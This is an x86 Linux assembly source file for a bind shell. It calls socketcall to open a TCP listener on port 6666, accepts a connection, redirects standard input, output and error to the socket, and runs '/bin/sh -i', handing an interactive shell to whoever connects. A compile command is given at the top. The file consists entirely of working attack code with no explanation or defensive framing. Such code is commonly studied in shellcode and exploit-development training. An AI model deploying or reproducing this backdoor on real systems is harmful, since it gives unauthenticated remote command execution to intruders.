// Compile this code with : 'as bind1.s -o bind1.o && ld bind1.o -o bindshell'

.section  .data
    serv_addr: .byte 2, 0, 0x1a, 0xa, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    arg_socket: .long 2, 1, 6
    binsh: .string "/bin/sh"
    arg_i: .string "-i"
    arg_execve: .long (binsh), (arg_i), 0

.section .bss
    bind_args: .fill 12
    listen_args: .fill 8
    accept_args: .fill 12
    
.section .text
.global _start

_start:

// socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    mov $0x66, %eax
    mov $1, %ebx
    mov $arg_socket, %ecx
    int $0x80
    mov %eax, %edi

// create array of arguments for bind
    mov %edi, (bind_args)
    movl $serv_addr, (bind_args+4)
    movl $16, (bind_args+8)

// bind(soc, &serv_addr, sizeof(serv_addr))
    mov $0x66, %eax
    mov $2, %ebx
    mov $bind_args, %ecx
    int $0x80

// create array of arguments for listen
    mov %edi, (listen_args)
    movl $1, (listen_args+4)

// listen(soc, 1);
    mov $0x66, %eax
    mov $0x4, %ebx
    mov $listen_args, %ecx
    int $0x80 
    
// create array of arguments for accept
    mov %edi, (accept_args)

// accept(soc, NULL, NULL)
    mov $0x66, %eax
    mov $5, %ebx
    mov $accept_args, %ecx
    int $0x80
    mov %eax, %edi

// dup2(soc, 0)
    mov $0x3f, %eax
    mov %edi, %ebx
    mov $0, %ecx
    int $0x80    

// dup2(soc, 1)
    mov $0x3f, %eax
    mov %edi, %ebx
    mov $1, %ecx
    int $0x80    

// dup2(soc, 2)
    mov $0x3f, %eax
    mov %edi, %ebx
    mov $2, %ecx
    int $0x80    

// execl("/bin/sh", ["/bin/sh", "-i"], NULL)
    mov $0xb, %eax
    mov $binsh, %ebx
    mov $arg_execve, %ecx
    xor %edx, %edx
    int $0x80
    
// exit(0)
    mov $1, %eax
    mov $0, %ebx
    int $0x80
